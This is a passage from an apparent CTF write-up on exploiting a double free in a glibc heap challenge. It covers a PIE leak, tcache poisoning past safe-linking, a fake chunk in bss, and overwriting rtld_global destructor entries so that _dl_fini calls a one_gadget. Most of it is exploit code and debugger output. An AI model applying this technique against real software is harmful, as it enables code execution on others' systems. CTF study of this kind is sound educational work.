+<p>Now, how to get rip control from here on?</p>
+
+<p>First, I checked, if there were any valid chunk sizes (16 byte-aligned) in <code class="language-plaintext highlighter-rouge">libc</code> or <code class="language-plaintext highlighter-rouge">ld</code>, which could help us to overwrite something useful (I was already thinking in the direction of <code class="language-plaintext highlighter-rouge">rtld_global</code> there, since with aligned chunks, I didn’t see any feasible way to overwrite <code class="language-plaintext highlighter-rouge">malloc_hook</code> or <code class="language-plaintext highlighter-rouge">free_hook</code>).</p>
+
+<p>But no chance, didn’t find any region, which contained a value, with which we could allocate a <code class="language-plaintext highlighter-rouge">0x50</code> or <code class="language-plaintext highlighter-rouge">0x30</code> chunk.</p>
+
+<p>So, after a lot of failed tries, I checked <code class="language-plaintext highlighter-rouge">bss</code> to see, if we could somehow do something there.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555558000 &lt;free@got.plt&gt;:       0x00007ffff7e8b2f0	0x0000555555555046
+0x555555558010 &lt;puts@got.plt&gt;:       0x00007ffff7e76380	0x0000555555555066
+0x555555558020 &lt;printf@got.plt&gt;:     0x00007ffff7e57b10	0x00007ffff7eefeb0
+0x555555558030 &lt;calloc@got.plt&gt;:     0x00007ffff7e8ba50	0x00007ffff7e7c5e0
+0x555555558040 &lt;setvbuf@got.plt&gt;:    0x00007ffff7e76aa0	0x00007ffff7e58f60
+0x555555558050:                      0x0000000000000000	0x0000555555558058
+0x555555558060 &lt;stdout@GLIBC_2.2.5&gt;: 0x00007ffff7fc2520	0x0000000000000000
+0x555555558070 &lt;stdin@GLIBC_2.2.5&gt;:  0x00007ffff7fc1800	0x0000000000000000
+0x555555558080 &lt;stderr@GLIBC_2.2.5&gt;: 0x00007ffff7fc2440	0x0000000000000000
+0x555555558090:                      0x0000000000000000	0x0000000000000000
+0x5555555580a0 &lt;free_plan&gt;:          0x0000000000000002	0x0000000000000002
+0x5555555580b0 &lt;free_plan+16&gt;:       0x00005555555581d0	0x0000000000000000
+0x5555555580c0 &lt;pro_plan&gt;:           0x0000000000000080	0x000000000000000a &lt;= max pro bound / current pro count
+0x5555555580d0 &lt;pro_plan+16&gt;:        0x000055555555d660	0x0000000000000000 &lt;= pro plan chunk 
+0x5555555580e0 &lt;free_plan_data&gt;:     0x000055555555d2a0	0x0000000000000000</code></pre></figure>
+
+<p>Also no good chunk sizes there, to for example attack <code class="language-plaintext highlighter-rouge">got</code> table… But, can we create a fake chunk anywhere in <code class="language-plaintext highlighter-rouge">bss</code>?</p>
+
+<p>Well, we kind of control the <code class="language-plaintext highlighter-rouge">current pro count</code> by adding more chunks, so we could create a valid chunk size there, and allocate a chunk overlapping the pointer to the <code class="language-plaintext highlighter-rouge">pro_plan</code> itself.</p>
+
+<p>This will not allow us to “directly” write data anywhere, but we could let it point to a table structure (like dtors). Creating chunks then in the <code class="language-plaintext highlighter-rouge">pro plan</code>, could potentially overwrite a table entry with a heap chunk, from which <code class="language-plaintext highlighter-rouge">_dl_fini</code> would then fetch the function to execute, which could lead to rip control.</p>
+
+<p>But, this would also mean, that we need to be able to do a clean <code class="language-plaintext highlighter-rouge">exit</code>, since the challenge will call <code class="language-plaintext highlighter-rouge">cleanup</code> before exitting, which will try to <code class="language-plaintext highlighter-rouge">free</code> all currently allocated chunks (which will most likely fail, after the whole mess we created by now on the heap).</p>
+
+<p>We’ll also need to find a way around that, but let’s keep that for later.</p>
+
+<p>First we’ll need a leak to <code class="language-plaintext highlighter-rouge">elf</code> region:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite an allocated chunk with pointer to pie address
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1c1d80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)[:</span><span class="mi">1</span><span class="p">]</span>                 <span class="c1"># fix chunksize
+</span>
+<span class="n">addfake</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># leak pie address from review
+</span><span class="n">PIE</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">review</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+	
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span></code></pre></figure>
+
+<p>This will create another entry in our freed <code class="language-plaintext highlighter-rouge">pro plan</code>, with its buffer pointing to a libc address, that contains a pointer to our <code class="language-plaintext highlighter-rouge">elf</code>.</p>
+
+<p>But at the current state, the heap is such a mess, that almost every allocation will go haywire. Thus we also need to put a valid chunksize in our payload to fix the followup fastbin. Otherwise <code class="language-plaintext highlighter-rouge">malloc</code> will notice the invalid fastbin and crash.</p>
+
+<p>Allocations and frees really start to get a pain from here on…</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] PIE          : 0x555555558080</code></pre></figure>
+
+<p>With this, we were successful on leaking an address pointing to <code class="language-plaintext highlighter-rouge">bss</code>, so we can now prepare putting a fake chunk there.</p>
+
+<p>But trying to use the double free to allocate a chunk onto <code class="language-plaintext highlighter-rouge">bss</code> now, triggered again <code class="language-plaintext highlighter-rouge">malloc_consolidate</code> and it checked the unsorted bin on the heap, which… well… wasn’t linked correctly anymore, since we were overwriting it with pro plan chunks.</p>
+
+<p>So, let’s first take a detour to repair this…</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># double free
+</span><span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+	
+<span class="c1"># point fd to unsorted bin
+</span><span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">((</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x130</span><span class="p">)</span><span class="o">^</span><span class="n">GUARD</span><span class="p">))</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
+
+<span class="c1"># fix unsorted bin pointers
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1c2a60</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1c2a60</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+
+<span class="n">adddesc</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>We use the double free again to allocate a fake chunk overlapping the bin, and then with the last allocation overwrite the size of the bin with <code class="language-plaintext highlighter-rouge">0x20</code> and putting valid <code class="language-plaintext highlighter-rouge">main_arena</code> pointers into it. By resizing it, we won’t have to bother with it anymore, since we’ll never do an allocation that could fit into a <code class="language-plaintext highlighter-rouge">0x20</code> bin, so hopefully, we’re good now.</p>
+
+<p>Now, we can go on with allocating into <code class="language-plaintext highlighter-rouge">bss</code>, by first increasing the <code class="language-plaintext highlighter-rouge">pro plan counter</code>, so that when our final allocation happens, we’ll have a <code class="language-plaintext highlighter-rouge">0x50</code> size in it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># increase pro plan counter
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">61</span><span class="p">):</span>
+    <span class="n">addfake</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    
+<span class="c1"># double free
+</span><span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># overwrite FD with pointer to pro_plan address
+</span><span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">((</span><span class="n">PIE</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">^</span><span class="n">GUARD</span><span class="p">))</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">bss
+
+0x5555555580b0 &lt;free_plan+16&gt;:   0x00005555555581d0	0x0000000000000000
+0x5555555580c0 &lt;pro_plan&gt;:       0x0000000000000080	0x000000000000004f &lt;= pro plan counter
+0x5555555580d0 &lt;pro_plan+16&gt;:    0x000055555555d660	0x0000000000000000
+0x5555555580e0 &lt;free_plan_data&gt;: 0x000055555555d2a0	0x0000000000000000
+
+main_arena
+
+0x7ffff7fc1a00:	0x0000000000000000	0x0000000000000001
+0x7ffff7fc1a10:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a20:	0x0000000000000000	0x00005555555580c0 &lt;= 0x50 fastbin pointing to pro_plan chunk
+0x7ffff7fc1a30:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a40:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a50:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a60:	0x000055555555ee00	0x000055555555d740</code></pre></figure>
+
+<p>Looking good. The next allocation will increase the <code class="language-plaintext highlighter-rouge">pro plan counter</code> to <code class="language-plaintext highlighter-rouge">0x50</code> and then allocate the next chunk at <code class="language-plaintext highlighter-rouge">0x00005555555580c0</code>, which will succeed, since we have a valid chunk size there now.</p>
+
+<p>So, with the next chunk, we’ll be able to overwrite the <code class="language-plaintext highlighter-rouge">pro_plan</code> pointer itself. Keep in mind, that we’ll not be able to write arbitrary data there, but we’ll overwrite the target region with pointers to our heap chunks. That’s why I went for <code class="language-plaintext highlighter-rouge">rtld_global</code>.</p>
+
+<p>After some experimentation (aka debugging the hell out of <code class="language-plaintext highlighter-rouge">_dlfini</code>), the following region looked good</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7ffe1d0:	0x0000000000000000	0x00007ffff7ffe728
+0x7ffff7ffe1e0:	0x0000000000000000	0x000055555555c010
+0x7ffff7ffe1f0:	0x000055555555c0f0	0x000055555555c0e0
+0x7ffff7ffe200:	0x0000000000000000	0x000055555555c090
+0x7ffff7ffe210:	0x000055555555c0a0	0x000055555555c120
+0x7ffff7ffe220:	0x000055555555c130	0x000055555555c140
+0x7ffff7ffe230:	0x000055555555c0b0	0x000055555555c0c0
+0x7ffff7ffe240:	0x000055555555c020	0x000055555555c030</code></pre></figure>
+
+<p>We have to keep in mind, that we have already allocated <code class="language-plaintext highlighter-rouge">0x50</code> chunks, so when overwriting the <code class="language-plaintext highlighter-rouge">pro_plan</code> counter, we want to point it to <code class="language-plaintext highlighter-rouge">dest_address-(0x50*0x18)</code>, so that the next allocations will be written to <code class="language-plaintext highlighter-rouge">dest_address</code>.</p>
+
+<p>We’ll first start putting some placeholder chunks there, which will be needed later (this is the result from hours of fiddling around in
+<code class="language-plaintext highlighter-rouge">ld</code>, so it’s a bit hard to explain in the right order, but should become clearer later on)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">LOCAL</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">ASLR</span><span class="p">:</span>
+  <span class="n">LD</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1d1000</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="n">LD</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1cb000</span>
+
+<span class="n">RTLD</span> <span class="o">=</span> <span class="n">LD</span> <span class="o">+</span> <span class="mh">0x2e1d0</span>
+<span class="n">TARGET</span> <span class="o">=</span> <span class="n">RTLD</span><span class="o">-</span><span class="p">(</span><span class="mh">0x50</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"TARGET CHUNK : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">RTLD</span><span class="p">))</span>
+
+<span class="c1"># overwrite pro_plan address with address in rtld_global
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
+
+<span class="n">adddesc</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">addfake</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"X"</span><span class="o">*</span><span class="mi">19</span><span class="p">)</span>
+<span class="n">addfake</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"Y"</span><span class="o">*</span><span class="mi">19</span><span class="p">)</span>
+
+<span class="c1"># put a gadget placeholder here for later
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"Z"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+
+<span class="n">addfake</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x7ffff7ffe1d0
+0x7ffff7ffe1d0:	0x000055555555ee10	0x0000000000000020 chunk    / size
+0x7ffff7ffe1e0:	0x0000000000000000	0x000055555555ee40 is_freed / chunk
+0x7ffff7ffe1f0:	0x0000000000000020	0x0000000000000000 size     / is_freed
+0x7ffff7ffe200:	0x000055555555ee70	0x0000000000000020 chunk    / size
+0x7ffff7ffe210:	0x0000000000000000	0x000055555555c120 is_freed
+0x7ffff7ffe220:	0x000055555555c130	0x000055555555c140
+0x7ffff7ffe230:	0x000055555555c0b0	0x000055555555c0c0</code></pre></figure>
+
+<p>If we could exit now (getting through cleanup without a crash), this would just exit cleanly, since we don’t have overwritten any dtors by now. This was just to prepare some placeholders, which we’ll need later to be able to cleanly call <code class="language-plaintext highlighter-rouge">one_gadget</code>.</p>
+
+<p>With the next allocations, we’ll overwrite a dtor pointer, which will be called later on, but we now have to also think about, how we can survice <code class="language-plaintext highlighter-rouge">cleanup</code> in order to arrive at <code class="language-plaintext highlighter-rouge">_dl_fini</code> at all.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># double free
+</span><span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">CALL</span> <span class="o">=</span> <span class="mh">0xfacebabe</span>
+	
+<span class="c1"># overwrite free fd with ptr to pro plan again
+</span><span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">((</span><span class="n">PIE</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">^</span><span class="n">GUARD</span><span class="p">))</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">))</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL</span><span class="p">))</span>        <span class="c1"># overwrite dtor entry
+</span><span class="n">addfake</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span></code></pre></figure>
+
+<p>We again trigger a double free, so that we can control, where next allocations will go to. We then overwrite the FD of the doubly freed chunk with a pointer to <code class="language-plaintext highlighter-rouge">pro_plan</code> again. Then we’ll allocate a dummy chunk to pull in our fake fd into <code class="language-plaintext highlighter-rouge">main_arena</code>.</p>
+
+<p>The last description will now overwrite a dtor pointer in <code class="language-plaintext highlighter-rouge">rtld_global</code> with <code class="language-plaintext highlighter-rouge">0xfacebabe</code>, which could lead to code execution, if we make it there.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x7ffff7ffe1d0
+0x7ffff7ffe1d0:	0x000055555555ee10	0x0000000000000020
+0x7ffff7ffe1e0:	0x0000000000000000	0x000055555555ee40
+0x7ffff7ffe1f0:	0x0000000000000020	0x0000000000000000
+0x7ffff7ffe200:	0x000055555555ee70	0x0000000000000020
+0x7ffff7ffe210:	0x0000000000000000	0x000055555555d5c0
+0x7ffff7ffe220:	0x0000000000000040	0x0000000000000000
+0x7ffff7ffe230:	0x000055555555d610	0x0000000000000040
+0x7ffff7ffe240:	0x0000000000000000	0x000055555555d5c0 &lt;= fake dtor chunk
+0x7ffff7ffe250:	0x0000000000000040	0x0000000000000000
+0x7ffff7ffe260:	0x000055555555eea0	0x0000000000000020
+
+gef➤  x/30gx 0x000055555555d5c0
+0x55555555d5c0:	0x00000000deadbeef	0x00000000facebabe &lt;= dtor entry
+0x55555555d5d0:	0x0000000000000000	0x0000000000000000
+0x55555555d5e0:	0x0000000000000000	0x0000000000000000
+0x55555555d5f0:	0x0000000000000000	0x0000000000000000
+0x55555555d600:	0x0000000000000000	0x0000000000000051</code></pre></figure>
+
+<p>The next allocation, will again overwrite the <code class="language-plaintext highlighter-rouge">pro_plan</code> pointer, since we already placed a FD pointing there in <code class="language-plaintext highlighter-rouge">main_arena</code>.</p>
+
+<p>We’ll now let it point directly above itself (subtracting the appropriate offset of already allocated chunks again).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite pro_plan with address above pro plan to overwrite allocated chunk count (to make free work)
+</span><span class="n">TARGET</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="mh">0x38</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="mh">0x58</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
+
+<span class="n">adddesc</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x5555555580a0 &lt;free_plan&gt;:    0x0000000000000002	0x0000000000000002
+0x5555555580b0 &lt;free_plan+16&gt;: 0x00005555555581d0	0x0000000000000000 &lt;= next allocation will be stored here
+0x5555555580c0 &lt;pro_plan&gt;:     0x0000000000000080	0x0000000000000058 
+0x5555555580d0 &lt;pro_plan+16&gt;:  0x0000555555557878	0x0000000000000000</code></pre></figure>
+
+<p>By doing this, the next chunk allocation will write the buffer address to <code class="language-plaintext highlighter-rouge">0x5555555580b8</code>, its size to <code class="language-plaintext highlighter-rouge">0x5555555580c0</code> and it’s <code class="language-plaintext highlighter-rouge">is_freed</code> value to <code class="language-plaintext highlighter-rouge">0x5555555580c0</code> (which happens to be the <code class="language-plaintext highlighter-rouge">pro_plan counter</code>).</p>
+
+<p>This will effectively set the <code class="language-plaintext highlighter-rouge">pro_plan_counter</code> to <code class="language-plaintext highlighter-rouge">0</code>. Exactly what we need to fix <code class="language-plaintext highlighter-rouge">cleanup</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xcda5d</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE_GADGET</span><span class="p">)</span>
+
+<span class="n">addfake</span><span class="p">(</span><span class="mi">31</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x5555555580b0 &lt;free_plan+16&gt;: 0x00005555555581d0	0x000055555555eed0
+0x5555555580c0 &lt;pro_plan&gt;:     0x0000000000000020	0x0000000000000000 &lt;= pro_plan_counter 0
+0x5555555580d0 &lt;pro_plan+16&gt;:  0x0000555555557878	0x0000000000000000</code></pre></figure>
+
+<p>Finally, time to exit and trigger our chain (and to fix it up).</p>
+
+<p>Since, <code class="language-plaintext highlighter-rouge">cleanup</code> is now executed nice and clean, we’ll end up in <code class="language-plaintext highlighter-rouge">dl_fini</code>, running into our fake dtors there.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x000055555555d5c0  →  0x00000000deadbeef
+$rbx   : 0x00007ffff7ffd000  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$rcx   : 0x0               
+$rdx   : 0x0000555555557dd8  →  0x0000555555555170  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
+$rsp   : 0x00007fffffffda80  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$rbp   : 0x00007fffffffdaf0  →  0x0000000000000000
+$rsi   : 0x0               
+$rdi   : 0x0000555555558060  →  0x00007ffff7fc2520  →  0x00000000fbad2887
+$rip   : 0x00007ffff7fe16a4  →  0xff07034908408b48
+$r8    : 0x2               
+$r9    : 0x1               
+$r10   : 0x00007ffff7f73ac0  →  0x0000000100000000
+$r11   : 0x246             
+$r12   : 0x0               
+$r13   : 0x00007fffffffda80  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$r14   : 0x0000555555557dd0  →  0x00005555555551c0  →  &lt;frame_dummy+0&gt; endbr64 
+$r15   : 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7fe1698                  mov    rax, QWORD PTR [r15+0xa8]
+   0x7ffff7fe169f                  test   rax, rax
+   0x7ffff7fe16a2                  je     0x7ffff7fe16ad
+●→ 0x7ffff7fe16a4                  mov    rax, QWORD PTR [rax+0x8]
+   0x7ffff7fe16a8                  add    rax, QWORD PTR [r15]
+   0x7ffff7fe16ab                  call   rax
+   0x7ffff7fe16ad                  mov    esi, DWORD PTR [rbp-0x3c]
+   0x7ffff7fe16b0                  test   esi, esi
+   0x7ffff7fe16b2                  jne    0x7ffff7fe16c2
+──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffda80│+0x0000: 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f	 ← $rsp, $r13
+0x00007fffffffda88│+0x0008: 0x00007ffff7ffe750  →  0x00007ffff7fce000  →  0x00010102464c457f
+0x00007fffffffda90│+0x0010: 0x00007ffff7fc8000  →  0x00007ffff7dff000  →  0x03010102464c457f
+0x00007fffffffda98│+0x0018: 0x00007ffff7ffda08  →  0x00007ffff7fd0000  →  0x00010102464c457f
+0x00007fffffffdaa0│+0x0020: 0x00007fffffffdaa0  →  [loop detected]
+0x00007fffffffdaa8│+0x0028: 0x00007fffffffdaa0  →  0x00007fffffffdaa0  →  [loop detected]</code></pre></figure>
+
+<p>This will now fetch the value from <code class="language-plaintext highlighter-rouge">rax+0x8</code> and add the value at <code class="language-plaintext highlighter-rouge">r15</code> (<code class="language-plaintext highlighter-rouge">0x0000555555554000</code>, which is <code class="language-plaintext highlighter-rouge">elf base</code>) to it, and then call it.</p>
+
+<p>We previously put <code class="language-plaintext highlighter-rouge">0xfacebabe</code> there, so this would now call <code class="language-plaintext highlighter-rouge">0x55565023fabe</code>. Not quite right, so let’s go back there and fix that value.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">CALL</span> <span class="o">=</span> <span class="mh">0x7ffffacebabe</span>
+
+<span class="c1"># overwrite free fd with ptr to pro plan again	
+</span><span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">((</span><span class="n">PIE</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">^</span><span class="n">GUARD</span><span class="p">))</span>	
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">))</span>	
+<span class="n">adddesc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">CALL</span><span class="o">-</span><span class="p">(</span><span class="n">PIE</span><span class="o">-</span><span class="mh">0x4080</span><span class="p">)))</span>	</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x7ffffacebabe    
+$rbx   : 0x00007ffff7ffd000  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$rcx   : 0x0               
+$rdx   : 0x0000555555557dd8  →  0x0000555555555170  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
+$rsp   : 0x00007fffffffda80  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$rbp   : 0x00007fffffffdaf0  →  0x0000000000000000
+$rsi   : 0x0               
+$rdi   : 0x0000555555558060  →  0x00007ffff7fc2520  →  0x00000000fbad2887
+$rip   : 0x00007ffff7fe16ab  →  0x75f685c4758bd0ff
+$r8    : 0x2               
+$r9    : 0x1               
+$r10   : 0x00007ffff7f73ac0  →  0x0000000100000000
+$r11   : 0x246             
+$r12   : 0x0               
+$r13   : 0x00007fffffffda80  →  0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$r14   : 0x0000555555557dd0  →  0x00005555555551c0  →  &lt;frame_dummy+0&gt; endbr64 
+$r15   : 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7fe16a2                  je     0x7ffff7fe16ad
+●  0x7ffff7fe16a4                  mov    rax, QWORD PTR [rax+0x8]
+   0x7ffff7fe16a8                  add    rax, QWORD PTR [r15]
+ → 0x7ffff7fe16ab                  call   rax
+   0x7ffff7fe16ad                  mov    esi, DWORD PTR [rbp-0x3c]
+   0x7ffff7fe16b0                  test   esi, esi
+   0x7ffff7fe16b2                  jne    0x7ffff7fe16c2
+   0x7ffff7fe16b4                  mov    ecx, DWORD PTR [rip+0x1b046]        # 0x7ffff7ffc700
+   0x7ffff7fe16ba                  test   ecx, ecx
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffda80│+0x0000: 0x00007ffff7ffe1a0  →  0x0000555555554000  →  0x00010102464c457f	 ← $rsp, $r13
+0x00007fffffffda88│+0x0008: 0x00007ffff7ffe750  →  0x00007ffff7fce000  →  0x00010102464c457f
